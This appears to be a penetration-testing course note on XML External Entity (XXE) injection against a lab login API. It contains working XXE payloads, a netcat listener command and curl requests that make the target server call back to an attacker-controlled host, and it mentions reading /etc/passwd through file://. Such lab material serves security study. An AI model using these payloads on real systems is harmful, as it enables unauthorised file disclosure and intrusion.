# XML External Entity (XXE) Injection
Refer to [[CBBH Modules (For Testing)/3. Input-Based Attacks/7. XXE Injection/XXE Prevention]] section for more in-depth techniques.

XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down.
## Example Scenario
Suppose we are assessing such an application residing in `http://<TARGET IP>:3001`.

By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.

Lets try logging in and capturing our login request with Burp:
![HTTP POST request to /api/login with XML payload containing email and password.](https://academy.hackthebox.com/storage/modules/160/11.png)
- We notice that an API is handling the user authentication functionality of the application.
- User authentication is generating XML data.

Let us try crafting an exploit to read internal files such as _/etc/passwd_ on the server.

First, we will need to append a DOCTYPE (DTD) to this request.
#### What is a DOCTYPE (DTD)?
Check [[CBBH Modules (For Testing)/3. Input-Based Attacks/7. XXE Injection/XML Basics]]

Defines the structure and the legal elements and attributes of an XML document. 

Our current payload is:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```
- We defined a DTD called _pwn_, and inside of that, we have an `ENTITY`.
- We have called our external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.

Let us set up a Netcat listener as follows.
```shell
nc -nlvp 4444
```

Now let us make an API call containing the payload we crafted above.
```shell
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
```

If we notice no connection being made to our listener, this is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.
```shell
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```

After the call to the API, you will notice a connection being made to the netcat listener.
- This shows the API is vulnerable to XXE Injection.
